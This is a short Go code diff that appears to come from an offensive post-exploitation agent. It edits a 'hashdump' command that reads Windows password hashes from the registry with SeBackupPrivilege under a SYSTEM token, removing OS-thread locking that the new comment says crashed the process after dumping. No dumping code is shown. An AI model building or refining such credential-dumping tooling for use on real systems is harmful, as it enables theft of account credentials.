@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"runtime"
 	"strings"
 	"unsafe"
 
@@ -45,12 +44,9 @@ type hashdumpArgs struct {
 }
 
 func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
-	// Lock goroutine to OS thread — registry operations with SeBackupPrivilege
-	// require thread-level privilege consistency. Without this, Go's goroutine
-	// scheduler can migrate us to a different OS thread between privilege
-	// adjustment and registry access, causing silent failures or crashes.
-	runtime.LockOSThread()
-	defer runtime.UnlockOSThread()
+	// Note: runtime.LockOSThread() was removed — SYSTEM process token grants
+	// SeBackupPrivilege on all threads, and LockOSThread was causing process
+	// crashes during response delivery after hashdump completed.
 
 	var args hashdumpArgs
 	if task.Params != "" {
